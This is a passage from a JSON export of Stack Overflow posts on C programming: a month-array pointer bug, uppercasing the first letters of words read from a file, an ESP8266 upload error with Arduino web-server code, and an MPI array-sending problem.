"https://www.gravatar.com/avatar/7f10ec2b45320ee843e539d705c31d08?s=128&d=identicon&r=PG", "display_name": "turbulencetoo", "link": "https://stackoverflow.com/users/3022310/turbulencetoo"}, "is_accepted": false, "score": 1, "last_activity_date": 1482877324, "creation_date": 1482877324, "answer_id": 41352903, "question_id": 41352854, "link": "https://stackoverflow.com/questions/41352854/why-do-i-have-to-skip-the-month-of-february-in-the-for-loop-and-use-mes-feverei/41352903#41352903", "title": "Why do I have to skip the month of february in the for loop and use mes-&gt;fevereiro[j] instead of mes-&gt;meses[1][j]?", "body": "<p>I believe the problem is that this allocation:</p>\n\n<pre><code>  char *2Darray[2]={somearray, somepointer};\n</code></pre>\n\n<p>doesn't behave as you expect for the entire lifetime of <code>somepointer</code>.</p>\n\n<p>That is to say, when you allocate memory, and then have <code>somepointer</code> point to that memory, <code>2Darray[1]</code> is still a char* that points somewhere else. Whatever value <code>somepointer</code> was holding/pointing to when the struct was initialized will be the value in <code>2Darray[1]</code>.</p>\n"}], "owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "closed_date": 1482879726, "answer_count": 1, "score": -5, "last_activity_date": 1482881977, "creation_date": 1482876958, "last_edit_date": 1482881977, "question_id": 41352854, "link": "https://stackoverflow.com/questions/41352854/why-do-i-have-to-skip-the-month-of-february-in-the-for-loop-and-use-mes-feverei", "closed_reason": "Not suitable for this site", "title": "Why do I have to skip the month of february in the for loop and use mes-&gt;fevereiro[j] instead of mes-&gt;meses[1][j]?", "body": "<pre><code>typedef struct \n\n{ \n\n    char janeiro[31];\n    char *fevereiro;\n    char marco[31];\n    char abril[30];\n    char maio[31];\n    char junho[30];\n    char julho[31];\n    char agosto[31];\n    char setembro[30];\n    char outubro[31];\n    char novembro[30];\n    char dezembro[31];\n\n    int mesSize[12] = { 31, 28, 31, 30, 31 , 30, 31, 31, 30 , 31, 30, 31 };\n    char *meses[12]={ janeiro, fevereiro, marco, abril, maio, junho, julho, agosto, setembro, outubro, novembro, dezembro };\n\n} MESES;\n\n\nint n_diasK(MESES *mes)\n\n{\n    int i, j, counter=0;\n\n    for (i = 0; i &lt; 12; i++)\n    {\n\n\n        for(j = 0; j &lt; (mes-&gt;mesSize[i]) ; j++){\n\n            if (i == 1)\n            {\n                if (mes-&gt;fevereiro[j] == 'K');\n                counter++;\n\n            }\n\n            else if (mes-&gt;meses[i][j] == 'K' )\n                counter++;\n\n        }\n\n\n    }\n\n    return counter;\n\n}\n\nvoid menu()\n{\n\n  MESES mes;\n\n  randLetters(year,&amp;mes);\n\n  n_diasK(&amp;mes);\n\n}\n</code></pre>\n\n<p>Ok this is the relevant part of the real program, basically what the program does is it asks for the user to select a year and then it assigns to each day of each month a random letter, in the randLetters() function, and it then has to find how many days have the letter 'K'. In the structure the char *fevereiro(february) is a pointer instead of an array because I need to calculate the leap year. The code I posted above works but I had to include a special case for february <code>if(mes-&gt;fevereiro[j] == 'K')</code> because if run the for loop without this check it crashes when it reaches <code>mes-&gt;meses[1][j] == 'K'</code>.</p>\n"}, {"tags": ["c", "text", "file-handling"], "comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1482876892, "post_id": 41352810, "comment_id": 69907599, "body": "why do you have this line <code>getch();</code>?"}, {"owner": {"reputation": 27, "user_id": 1834168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6a7bbc24a0f72d466936f01bce3fabd?s=128&d=identicon&r=PG", "display_name": "Atakan Bal", "link": "https://stackoverflow.com/users/1834168/atakan-bal"}, "reply_to_user": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 1, "creation_date": 1482877365, "post_id": 41352810, "comment_id": 69907740, "body": "just to see program flow slowly, nothing else"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 1, "creation_date": 1482877671, "post_id": 41352810, "comment_id": 69907840, "body": "A debugger would be better"}], "answers": [{"tags": [], "owner": {"reputation": 356, "user_id": 7337790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nTugP.jpg?s=128&g=1", "display_name": "zsram", "link": "https://stackoverflow.com/users/7337790/zsram"}, "is_accepted": false, "score": 1, "last_activity_date": 1482877898, "last_edit_date": 1482877898, "creation_date": 1482877211, "answer_id": 41352890, "question_id": 41352810, "link": "https://stackoverflow.com/questions/41352810/read-a-text-file-and-uppercase-first-letter-of-every-word-in-c/41352890#41352890", "title": "Read a text file and uppercase first letter of every word in C", "body": "<p>Assuming you really want to do that of waiting after every space is read (assumed reason for your getch() there), then you may try setting i = 0 before your do loop. Then if( i == 0 ) then chr = toupper(chr) and increment i. Finally, within the if( chr == ' ') include i = 0 again. </p>\n\n<p>Also, if you want to consider other spacing characters (linebreaks, tabs, etc) then you should <code>include &lt;ctype.h&gt;</code> and use isspace() function like <code>if( isspace(chr) )</code> instead of <code>if( chr == ' ' )</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 197, "user_id": 3548762, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/1d831881f41f2920f49cf236b0e3f296?s=128&d=identicon&r=PG&f=1", "display_name": "man", "link": "https://stackoverflow.com/users/3548762/man"}, "is_accepted": false, "score": 2, "last_activity_date": 1482878621, "last_edit_date": 1482878621, "creation_date": 1482877637, "answer_id": 41352955, "question_id": 41352810, "link": "https://stackoverflow.com/questions/41352810/read-a-text-file-and-uppercase-first-letter-of-every-word-in-c/41352955#41352955", "title": "Read a text file and uppercase first letter of every word in C", "body": "<p>This should do the trick</p>\n\n<pre><code>bool upperNext = true;\n\nwhile((chr = fgetc(fp)) != EOF) {\n    if(chr == ' ' || chr == '\\r' || chr == '\\n') {\n       upperNext = true;\n    } else if(upperNext) {\n       chr = toupper(chr);\n       upperNext = false;\n    }\n\n    printf(\"%c\" , chr);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1482880832, "last_edit_date": 1482880832, "creation_date": 1482878365, "answer_id": 41353072, "question_id": 41352810, "link": "https://stackoverflow.com/questions/41352810/read-a-text-file-and-uppercase-first-letter-of-every-word-in-c/41353072#41353072", "title": "Read a text file and uppercase first letter of every word in C", "body": "<blockquote>\n  <p>... how to focus on first letter ...(?)</p>\n</blockquote>\n\n<p>Detect the first letter of each word by saving the previous character.  Let a word being with 1) any sequence of <code>&lt;white-space&gt;&lt;Letter&gt;</code> or 2) if the first character read is a letter.</p>\n\n<p>Other trouble: <code>EOF</code> detection too late.  Check for <code>EOF</code> right after <code>fgetc()</code></p>\n\n<pre><code>// EOF test too late\n  chr = fgetc(fp);\n  chr = toupper(chr);\n  printf(\"%c\" , chr);\n} while(chr!=EOF); // too late\n\n// Instead\n  chr = fgetc(fp);\n  if (chr == EOF) break;\n</code></pre>\n\n<p>All together</p>\n\n<pre><code>int previous = ' ';\nwhile ((chr = fgetc(fp)) != EOF) {\n  if (isspace(previous) &amp;&amp; isalpha(chr)) {\n    chr = toupper(chr);  // uppercase first letter of every word\n  }\n  printf(\"%c\" , chr);\n  previous = chr;\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 1834168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6a7bbc24a0f72d466936f01bce3fabd?s=128&d=identicon&r=PG", "display_name": "Atakan Bal", "link": "https://stackoverflow.com/users/1834168/atakan-bal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 212, "favorite_count": 0, "accepted_answer_id": 41353072, "answer_count": 3, "score": 0, "last_activity_date": 1482880832, "creation_date": 1482876632, "question_id": 41352810, "link": "https://stackoverflow.com/questions/41352810/read-a-text-file-and-uppercase-first-letter-of-every-word-in-c", "title": "Read a text file and uppercase first letter of every word in C", "body": "<p>I wanna read an existing file and uppercase the first letter of every word. So I thought I can figure out words from the space in between them but I don't know how to focus on first letter so I just make all uppercase, here's my code so far.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;conio.h&gt;\n#include &lt;ctype.h&gt;\n\nint main()\n{\nint chr,i;\nFILE *fp;\nfp = fopen(\"DATA.txt\" , \"r\");\n\ndo\n{\n    chr = fgetc(fp);\n    chr = toupper(chr);\n    printf(\"%c\" , chr);\n\n    if (chr==' ')\n        {\n            getch();\n        }\n\n} while(chr!=EOF);\n\nfclose(fp);\n}\n</code></pre>\n"}, {"tags": ["c", "arduino", "esp8266"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7347449, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47b1fd06df5af339bc4a6ba94ea62171?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Vantricht", "link": "https://stackoverflow.com/users/7347449/thomas-vantricht"}, "edited": false, "score": 0, "creation_date": 1482933357, "post_id": 41355134, "comment_id": 69928315, "body": "The GPIO0 is connected woth a 10k resistor to ground and the CH_PD to VCC and it works. Thank you!"}], "tags": [], "owner": {"reputation": 463, "user_id": 1177962, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/dfae82d8238504857424d10cb40eaa1f?s=128&d=identicon&r=PG", "display_name": "Ngo Thanh Nhan", "link": "https://stackoverflow.com/users/1177962/ngo-thanh-nhan"}, "is_accepted": false, "score": 2, "last_activity_date": 1482897451, "creation_date": 1482897451, "answer_id": 41355134, "question_id": 41352796, "link": "https://stackoverflow.com/questions/41352796/warning-espcomm-sync-failed-error-espcomm-open-failed-error-espcomm-upload-me/41355134#41355134", "title": "warning: espcomm_sync failed error: espcomm_open failed error: espcomm_upload_mem failed", "body": "<p>Connect GPIO0 and GPIO15 to Ground with resistors 10k.</p>\n"}, {"tags": [], "owner": {"reputation": 3, "user_id": 2954662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b4b33b0f6864a5098761be067f3d11d?s=128&d=identicon&r=PG&f=1", "display_name": "Sahan Atulugama", "link": "https://stackoverflow.com/users/2954662/sahan-atulugama"}, "is_accepted": false, "score": 0, "last_activity_date": 1512585958, "creation_date": 1512585958, "answer_id": 47681404, "question_id": 41352796, "link": "https://stackoverflow.com/questions/41352796/warning-espcomm-sync-failed-error-espcomm-open-failed-error-espcomm-upload-me/47681404#47681404", "title": "warning: espcomm_sync failed error: espcomm_open failed error: espcomm_upload_mem failed", "body": "<p>for the error \"espcomm_open_failed\"</p>\n\n<p>ESP01 Flash config:\nFlash real size: 1048576 1MB 512SPIFFS\nFlash ide speed: 40000000 - 4MHz\nFlash ide mode: DOUT</p>\n\n<p>ESP07 Flash config:\nFlash real size: 1048576 1MB 512SPIFFS\nFlash ide speed: 40000000 - 4MHz\nFlash ide mode: QIO</p>\n\n<p>When programming the ESP8266, connect VCC, ground, TX and RX properly. (FTDI &lt;->ESP)</p>\n\n<pre><code>VCC --&gt; 3.3V\nGND --&gt; GND\nTX --&gt;RX\nRX --&gt; TX\n</code></pre>\n\n<p>(Power from USB 2.0 was enough to program ESP01 and ESP07; I used arduino software to program; Nodemcu flasher can also be used to flash)</p>\n\n<p>In order to turn into program the ESP, first both the RESET and the GPIO0 should be connected to the ground.\nThen keep it for around 5 seconds\nThen remove the RESET BUT do not remove GPIO0.\ufeff</p>\n"}], "owner": {"reputation": 1, "user_id": 7347449, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47b1fd06df5af339bc4a6ba94ea62171?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Vantricht", "link": "https://stackoverflow.com/users/7347449/thomas-vantricht"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6238, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1512585958, "creation_date": 1482876567, "last_edit_date": 1482930498, "question_id": 41352796, "link": "https://stackoverflow.com/questions/41352796/warning-espcomm-sync-failed-error-espcomm-open-failed-error-espcomm-upload-me", "title": "warning: espcomm_sync failed error: espcomm_open failed error: espcomm_upload_mem failed", "body": "<pre><code> /*\n * 115200. Connect GPIO 0 of your ESP8266 to VCC and reset the board\n */\n\n#include &lt;ESP8266WiFi.h&gt;\n#include &lt;WiFiClient.h&gt;\n#include &lt;ESP8266WebServer.h&gt;\n#include &lt;ESP8266mDNS.h&gt;\n\nMDNSResponder mdns;\n\n// Network id and pw\nconst char* ssid = \"MY_ID\";\nconst char* password = \"MY_PASSWORD\";\n\nESP8266WebServer server(80);\n\nString webPage = \"\";\n\nint gpio0_pin = 0;\nint gpio2_pin = 2;\n\nvoid setup(void)\n{\n  webPage += \"&lt;h1&gt;ESP8266 Web Server&lt;/h1&gt;&lt;p&gt;Socket #1 &lt;a href=\\\"socket1On\\\"&gt;&lt;button&gt;ON&lt;/button&gt;&lt;/a&gt;&amp;nbsp;&lt;a href=\\\"socket1Off\\\"&gt;&lt;button&gt;OFF&lt;/button&gt;&lt;/a&gt;    &lt;/p&gt;\";\n  webPage += \"&lt;p&gt;Socket #2 &lt;a href=\\\"socket2On\\\"&gt;&lt;button&gt;ON&lt;/button&gt;&lt;/a&gt;&amp;nbsp;&lt;a     href=\\\"socket2Off\\\"&gt;&lt;button&gt;OFF&lt;/button&gt;&lt;/a&gt;&lt;/p&gt;\";\n\n  // preparing GPIOs\n  pinMode(gpio0_pin, OUTPUT);\n  digitalWrite(gpio0_pin, LOW);\n  pinMode(gpio2_pin, OUTPUT);\n  digitalWrite(gpio2_pin, LOW);\n\n  delay(1000);\n  Serial.begin(115200);\n  WiFi.begin(ssid, password);\n  Serial.println(\"\");\n\n  // Wait for connection\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    delay(500);\n    Serial.print(\".\");\n  }\n  Serial.println(\"\");\n  Serial.print(\"Connected to \");\n  Serial.println(ssid);\n  Serial.print(\"IP address: \");\n  Serial.println(WiFi.localIP());\n\n  if (mdns.begin(\"esp8266\", WiFi.localIP()))\n    Serial.println(\"MDNS responder started\");\n\n  server.on(\"/\", []()\n  {\n    server.send(200, \"text/html\", webPage);\n  });\n\n  server.on(\"/socket1On\", []()\n  {\n    server.send(200, \"text/html\", webPage);\n    digitalWrite(gpio0_pin, HIGH);\n    delay(1000);\n   });\n\n  server.on(\"/socket1Off\", []()\n  {\n    server.send(200, \"text/html\", webPage);\n    digitalWrite(gpio0_pin, LOW);\n    delay(1000);\n  });\n\n  server.on(\"/socket2On\", []()\n  {\n    server.send(200, \"text/html\", webPage);\n    digitalWrite(gpio2_pin, HIGH);\n    delay(1000);\n  });\n\n  server.on(\"/socket2Off\", []()\n  {\n    server.send(200, \"text/html\", webPage);\n    digitalWrite(gpio2_pin, LOW);\n    delay(1000);\n  });\n  server.begin();\n  Serial.println(\"HTTP server started\");\n}\n\nvoid loop(void)\n{\n  server.handleClient();\n}\n</code></pre>\n\n<p>Hi I'm trying to make a wifi webserver with the ESP8266 using an Arduino. The code is in this link: <a href=\"http://pastebin.com/bFNQSasv\" rel=\"nofollow noreferrer\">code</a>. I'm following the\n   steps of <a href=\"http://randomnerdtutorials.com/esp8266-web-server-with-arduino-ide/\" rel=\"nofollow noreferrer\">this site</a>. I've connected my yp-01 (USB to serial)\n   with my ESP8266.</p>\n\n<ul>\n<li><strong>USB --> ESP</strong> </li>\n<li>TX  --> RX</li>\n<li>RX  --> TX</li>\n</ul>\n\n<p>I use the 3.3V supply of my arduino mega.</p>\n\n<ul>\n<li><strong>ARDUINO --> ESP</strong></li>\n<li>3.3V    --> VCC</li>\n<li>GND     --> GND. </li>\n</ul>\n\n<p>When I try to upload the code it gives the error: </p>\n\n<blockquote>\n  <p>warning: espcomm_sync failed error: espcomm_open\n     failed error: espcomm_upload_mem failed   </p>\n</blockquote>\n\n<p>I've read a lot of posts but none of them fixed my problem. Is there anyone who knows the solution or someone who had the same problem? I'm using ARduino IDE 1.6.9</p>\n"}, {"tags": ["c", "arrays", "parallel-processing", "mpi"], "comments": [{"owner": {"reputation": 8727, "user_id": 2999346, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dQ1wB.png?s=128&g=1", "display_name": "francis", "link": "https://stackoverflow.com/users/2999346/francis"}, "edited": false, "score": 2, "creation_date": 1482876019, "post_id": 41352494, "comment_id": 69907310, "body": "Welcome to Stackoverflow! The issue is likely due to the fact that the rows are allocated one after another. Then, using <code>MPI_Send(*subArray, sliceSize * width, MPI_INT,...)</code> becomes wrong because there are chunks of the array here and there, not a single clean buffer. It would be much easier to allocate the array so that all lines are contiguous in memory. See <a href=\"http://stackoverflow.com/questions/5901476/sending-and-receiving-2d-array-over-mpi\" title=\"sending and receiving 2d array over mpi\">stackoverflow.com/questions/5901476/&hellip;</a> ,in particular the answer of Jonathan Dursi."}, {"owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 0, "creation_date": 1482916975, "post_id": 41352494, "comment_id": 69919329, "body": "In addition to what francis said, do learn about <code>MPI_Scatter</code>."}, {"owner": {"reputation": 229, "user_id": 4070124, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ce0f695c5e1eb6c22340d36e8697c06d?s=128&d=identicon&r=PG&f=1", "display_name": "frcake", "link": "https://stackoverflow.com/users/4070124/frcake"}, "reply_to_user": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 0, "creation_date": 1482927974, "post_id": 41352494, "comment_id": 69925383, "body": "thank you it now works great with a single line ` int(*subArray)[width] = malloc(sizeof(int[(sliceSize + 2)][width]));` @Zulan , what would scatter do about left over pixels ? where Height % Size &gt; 0 ?"}, {"owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 0, "creation_date": 1482932631, "post_id": 41352494, "comment_id": 69927883, "body": "For the uneven case, use <code>MPI_Scatterv</code>."}], "owner": {"reputation": 229, "user_id": 4070124, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ce0f695c5e1eb6c22340d36e8697c06d?s=128&d=identicon&r=PG&f=1", "display_name": "frcake", "link": "https://stackoverflow.com/users/4070124/frcake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "closed_date": 1482927834, "answer_count": 0, "score": 0, "last_activity_date": 1483098985, "creation_date": 1482874534, "last_edit_date": 1483098985, "question_id": 41352494, "link": "https://stackoverflow.com/questions/41352494/c-mpi-dynamic-2d-array-weird-issue", "closed_reason": "Duplicate", "title": "C - MPI - dynamic 2d array - weird issue", "body": "<p>I'm writing a parallel image processing algorithm in C using MPI.</p>\n\n<p>The image is parsed to a 2d array , sliced according to the processors and sent to each process correctly!</p>\n\n<p>The weird problem is that when i print out the array , i get the last 8 Array elements as 0 .</p>\n\n<p>I tried adding <code>sliceSize * width + 8</code> and it <em>did</em> work!</p>\n\n<p>But then when i tried with different(larger) dimensions the 0's where much more.</p>\n\n<pre><code>int main(int argc, char *argv[]) {\n  TGA_Header header;\n  char output_filename[100];\n\n  if (argc != 2) {\n    printf(\"\\nUsage:\\n\");\n    printf(\"\\t./tga &lt;filename&gt;.tga\\n\\n\");\n    printf(\n        \"The input file should be a greyscale image with an 8-bit depth.\\n\\n\");\n    exit(0);\n  }\n\n  TGA *image = load_tga(argv[1], &amp;header);\n\n  /*\n   * Image processing starts here\n   */\n\n  int my_rank = 0, size = 0;\n  MPI_Init(&amp;argc, &amp;argv);\n  MPI_Comm_rank(MPI_COMM_WORLD, &amp;my_rank);\n  MPI_Comm_size(MPI_COMM_WORLD, &amp;size);\n  // Variable Initialization\n  int i = 0, k = 0, l = 0, j = 0, c = 0, d = 0, avg = 0, count = 0, sum = 0,\n      sliceSizeExt = 0, upper = 0, start = 0, end = 0, extrapixels = 0,\n      sliceSize = 0, height = 0, width = 0, **subArray, **subResult,\n      **subArrayFext, **subResultFext, **array, **result, **s, **r,\n      SLICEWIDTH = 0;\n  MPI_Status status;\n  MPI_Request request;\n  // Set Height and width!\n  width = image-&gt;w;\n  height = image-&gt;h;\n\n  // Dynamic allocation for both arrays\n\n  sliceSize = height / size;\n  SLICEWIDTH = sliceSize * width;\n\n  subArray = (int **)malloc(sizeof(int *) * sliceSize);\n\n  for (int i = 0; i &lt; sliceSize; i++) {\n    subArray[i] = (int *)malloc(sizeof(int) * width);\n  }\n\n  r = s = malloc(sizeof(int *) * sliceSize);\n  for (i = 0; i &lt; sliceSize; i++) {\n    s[i] = malloc(sizeof(int) * width);\n  }\n\n  /*\n     First and last arrays should be allocated with +1 line for the respected\n     ghost borders\n     Arrays for processes with rank 0 &gt; my_rank &gt; size should keep the same\n     allocation\n\n     Exception:\n     If the height/size modulo is (&gt;) Greater than (0) Zeroprintf(\"\\n Computing\n     bounds for process \")\n     }\n     Then it should be processed by the rank 0\n     Just to keep the communication dynamic.\n   */\n\n  extrapixels = height % size;\n  sliceSizeExt = sliceSize + extrapixels;\n\n  if (my_rank == 0) {\n    array = malloc(sizeof(int *) * height);\n\n    for (i = 0; i &lt; height; i++) {\n      array[i] = malloc(sizeof(int) * width);\n    }\n\n    printf(\n        \"\\nThese are the extra pixels! : %d\\n This is the Ext dimension:%d\\n\",\n        extrapixels, sliceSizeExt);\n\n    subArrayFext = malloc(sizeof(int *) * sliceSizeExt);\n    for (i = 0; i &lt; sliceSizeExt; i++) {\n      subArrayFext[i] = malloc(sizeof(int) * width);\n    }\n\n    printf(\"IM RANK %d , Array init!\\n\", my_rank);\n    printf(\"\\n***%d : Image dimensions %d %d\\n\", my_rank, height, width);\n    printf(\"\\n***********\\n%d Some statistics: \\nSlave Processes:%d\\nArray \"\n           \"Slice Size(height): %d\\nMoving on to Compute slice \"\n           \"bounds!\\n************\\n\",\n           my_rank, size - 1, sliceSize);\n    printf(\"\\n***%d Parsing pixel Array to 2d\\n\", my_rank);\n    // Parse image pixel array to 2d array\n    for (i = 0; i &lt; height; i++) {\n      for (j = 0; j &lt; width; j++) {\n        // use incremental counter for 1d array(: image-&gt;pixels[width*height])\n        // to 2d transformation\n        array[i][j] = image-&gt;pixels[upper];\n        upper++;\n      }\n    }\n\n    for (int i = 0; i &lt; height; i++) {\n      for (int j = 0; j &lt; width; j++) {\n        printf(\"%d\\t\", array[i][j]);\n      }\n      printf(\"\\n\");\n    }\n\n    // Compute the bounds for processes 1-2-3\n    for (int target = 0; target &lt; size; target++) {\n      printf(\"\\n\\nBounds for PROCESS:%d\\n\", target);\n      if (target == 0) {\n\n        start = target * sliceSize;\n        end = (start + sliceSize - 1) + extrapixels;\n      } else {\n        start = (target * sliceSize) + extrapixels;\n        end = start + sliceSize - 1;\n      }\n\n      printf(\"\\n\\n START : %d \\t END : %d\\n\", start, end);\n      printf(\"\\n\\n*****SLICE FOR PROCESS %d******\\n\\n\", target);\n      for (i = start; i &lt;= end; i++) {\n        for (j = 0; j &lt; width; j++) {\n          if (target == 0) {\n            subArrayFext[i - start][j] = array[i][j];\n          } else {\n            subArray[i - start][j] = array[i][j];\n          }\n        }\n      }\n\n      printf(\"\\nSlice Done!\\n\");\n\n      if (target &gt; 0) {\n        for (int k = 0; k &lt; sliceSize; k++) {\n          for (int l = 0; l &lt; width; l++) {\n            printf(\"%d\\t\", subArray[k][l]);\n          }\n          printf(\"\\n\");\n        }\n        printf(\"\\n Sending array to process %d\\n\", target);\n        MPI_Send(*subArray, sliceSize * width, MPI_INT, target, 10,\n                 MPI_COMM_WORLD);\n      }\n    }\n\n  } else {\n    printf(\"\\n-----------------\\nrank %d\\nmy size:%d\\n------------------\\n\",\n           my_rank, sliceSize * width);\n    MPI_Recv(*subArray, sliceSize * width, MPI_INT, 0, 10, MPI_COMM_WORLD,\n             &amp;status);\n    for (k = 0; k &lt; sliceSize; k++) {\n      for (l = 0; l &lt; width; l++) {\n        printf(\"R:%d-%d\\t\", my_rank, subArray[k][l]);\n      }\n      printf(\"\\n\");\n    }\n  }\n\n  free(image);\n  MPI_Finalize();\n  // return (0);\n}\n</code></pre>\n\n<p>this is what the printout looks like <em>and it's not the same as the array being sent</em>.</p>\n\n<pre><code>R:1-64  R:1-65  R:1-66  R:1-67  R:1-69  R:1-71  R:1-68  R:1-94  R:1-133 R:1-151 R:1-130 R:1-80  R:1-58  R:1-65  R:1-71  R:1-72  R:1-73  R:1-76  R:1-76  R:1-74  R:1-73  R:1-196 R:1-221 R:1-218 R:1-231 R:1-216 R:1-84  R:1-70  R:1-73  R:1-72\nR:1-62  R:1-64  R:1-66  R:1-68  R:1-71  R:1-66  R:1-88  R:1-170 R:1-181 R:1-180 R:1-185 R:1-171 R:1-90  R:1-67  R:1-73  R:1-69  R:1-64  R:1-65  R:1-66  R:1-73  R:1-66  R:1-123 R:1-214 R:1-198 R:1-208 R:1-143 R:1-67  R:1-74  R:1-73  R:1-73\nR:1-62  R:1-62  R:1-58  R:1-57  R:1-63  R:1-61  R:1-109 R:1-178 R:1-179 R:1-181 R:1-176 R:1-188 R:1-131 R:1-61  R:1-69  R:1-78  R:1-113 R:1-123 R:1-106 R:1-71  R:1-69  R:1-66  R:1-89  R:1-107 R:1-90  R:1-69  R:1-75  R:1-74  R:1-72  R:1-71\nR:1-59  R:1-64  R:1-99  R:1-119 R:1-98  R:1-61  R:1-82  R:1-169 R:1-183 R:1-185 R:1-179 R:1-187 R:1-108 R:1-59  R:1-86  R:1-164 R:1-172 R:1-179 R:1-182 R:1-149 R:1-71  R:1-71  R:1-68  R:1-66  R:1-66  R:1-64  R:1-62  R:1-60  R:1-68  R:1-70\nR:1-67  R:1-145 R:1-201 R:1-204 R:1-198 R:1-159 R:1-68  R:1-94  R:1-153 R:1-158 R:1-152 R:1-115 R:1-66  R:1-63  R:1-119 R:1-185 R:1-174 R:1-182 R:1-178 R:1-187 R:1-105 R:1-64  R:1-0   R:1-0   R:1-0   R:1-0   R:1-0   R:1-0   R:1-0   R:1-0\n</code></pre>\n\n<p>the R:1 stands for Rank:1</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"reputation": 1154, "user_id": 5511084, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/ypNzt.jpg?s=128&g=1", "display_name": "Berkin Akayd\u0131n", "link": "https://stackoverflow.com/users/5511084/berkin-akayd%c4%b1n"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482873905, "post_id": 41352368, "comment_id": 69906620, "body": "Its was an optional source to clearify myself. I wrote something before the video, i think its clear for understand the problem."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 2, "creation_date": 1482873990, "post_id": 41352368, "comment_id": 69906651, "body": "the actual problem of your question is not the link on the video, it&#39;s the ludicrious amount of code posted. You should narrow down the problem and create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> if you want us to help."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1482874030, "post_id": 41352368, "comment_id": 69906662, "body": "You need to restructure your program in some way to allow multiple IO streams. For example: multi-threads or use a multiplexing mechanism such as <code>select</code>."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1482875207, "post_id": 41352368, "comment_id": 69907055, "body": "And, just like your last post of this wall of code, I will ask you what you learned from your 